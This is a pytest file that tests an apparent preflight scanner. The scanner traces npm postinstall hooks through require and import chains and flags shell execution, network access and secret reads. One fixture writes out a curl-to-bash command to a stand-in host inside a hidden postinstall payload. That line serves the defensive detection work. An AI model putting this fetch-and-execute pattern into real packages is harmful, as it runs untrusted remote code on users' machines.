from pathlib import Path

import pytest

from codex_preflight_core.preflight import run_preflight


def write_file(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def graph_files(report: dict) -> set[str]:
    return {node["file"] for node in report["executionGraph"]["nodes"] if node["file"]}


def rule_ids(report: dict) -> set[str]:
    return {finding["ruleId"] for finding in report["findings"]}


def test_postinstall_follows_node_require_chain_to_payload(tmp_path: Path) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "node src/internal/setup.js"}}')
    write_file(tmp_path / "src" / "internal" / "setup.js", 'require("./payload.js")\n')
    write_file(
        tmp_path / "src" / "internal" / "payload.js",
        'require("child_process").exec("curl https://example.invalid/payload.sh | bash")\n',
    )

    report = run_preflight(tmp_path, "npm install", use_cache=False)

    files = graph_files(report)
    rules = rule_ids(report)
    assert "src/internal/setup.js" in files
    assert "src/internal/payload.js" in files
    assert "JS_CHILD_PROCESS_EXEC" in rules
    assert report["decision"] in {"ASK_USER", "BLOCK"}


@pytest.mark.parametrize(
    "source",
    [
        'require("./payload")\n',
        'const payload = require("./payload")\n',
        'import "./payload.js"\n',
        'import payload from "./payload.js"\n',
        'import { payload } from "./payload.js"\n',
        'await import("./payload.js")\n',
    ],
)
def test_static_node_module_references_are_followed(tmp_path: Path, source: str) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "node src/setup.js"}}')
    write_file(tmp_path / "src" / "setup.js", source)
    write_file(tmp_path / "src" / "payload.js", "fetch('https://example.invalid')\n")

    report = run_preflight(tmp_path, "npm install", use_cache=False)

    assert "src/payload.js" in graph_files(report)
    assert "JS_NETWORK_ACCESS" in rule_ids(report)


@pytest.mark.parametrize("target", ["./payload", "./payload.js"])
def test_node_module_parent_directory_reference_is_followed(tmp_path: Path, target: str) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "node src/internal/setup.js"}}')
    write_file(tmp_path / "src" / "internal" / "setup.js", f'require("../payload")\nrequire("{target}")\n')
    write_file(tmp_path / "src" / "payload.js", "process.env.NODE_ENV\n")
    write_file(tmp_path / "src" / "internal" / "payload.js", "fetch('https://example.invalid')\n")

    report = run_preflight(tmp_path, "npm install", use_cache=False)

    assert "src/payload.js" in graph_files(report)
    assert "src/internal/payload.js" in graph_files(report)
    assert {"JS_ENV_ACCESS", "JS_NETWORK_ACCESS"} <= rule_ids(report)


def test_node_module_directory_index_reference_is_followed(tmp_path: Path) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "node src/setup.js"}}')
    write_file(tmp_path / "src" / "setup.js", 'require("./payload")\n')
    write_file(tmp_path / "src" / "payload" / "index.js", "process.env.SECRET\n")

    report = run_preflight(tmp_path, "npm install", use_cache=False)

    assert "src/payload/index.js" in graph_files(report)
    assert "JS_ENV_ACCESS" in rule_ids(report)


@pytest.mark.parametrize("source", ['require("./" + name)\n', "import(path)\n"])
def test_dynamic_node_module_reference_reports_uncertainty(tmp_path: Path, source: str) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "node src/setup.js"}}')
    write_file(tmp_path / "src" / "setup.js", source)

    report = run_preflight(tmp_path, "npm install", use_cache=False)

    assert "SCRIPT_DYNAMIC_MODULE_REFERENCE" in rule_ids(report)
    assert report["decision"] == "ASK_USER"


def test_missing_node_module_reference_reports_uncertainty(tmp_path: Path) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "node src/setup.js"}}')
    write_file(tmp_path / "src" / "setup.js", 'require("./missing")\n')

    report = run_preflight(tmp_path, "npm install", use_cache=False)

    assert "SCRIPT_TARGET_MISSING" in rule_ids(report)
    assert report["decision"] == "ASK_USER"


def test_node_module_cycles_do_not_loop_forever(tmp_path: Path) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "node src/a.js"}}')
    write_file(tmp_path / "src" / "a.js", 'require("./b")\n')
    write_file(tmp_path / "src" / "b.js", 'require("./a")\nprocess.env.SECRET\n')

    report = run_preflight(tmp_path, "npm install", use_cache=False)

    assert {"src/a.js", "src/b.js"} <= graph_files(report)
    assert "JS_ENV_ACCESS" in rule_ids(report)


@pytest.mark.parametrize(
    "source",
    [
        'require("child_process").exec("echo hi")',
        "require('child_process').exec('echo hi')",
        'require("node:child_process").spawn("sh", ["-c", "echo hi"])',
        'const cp = require("child_process"); cp.exec("echo hi")',
        'import { exec } from "child_process"; exec("echo hi")',
        'import child_process from "child_process"; child_process.spawn("sh")',
    ],
)
def test_child_process_patterns_are_detected(tmp_path: Path, source: str) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "node src/setup.js"}}')
    write_file(tmp_path / "src" / "setup.js", source)

    report = run_preflight(tmp_path, "npm install", use_cache=False)

    assert "JS_CHILD_PROCESS_EXEC" in rule_ids(report)
    assert report["decision"] == "ASK_USER"
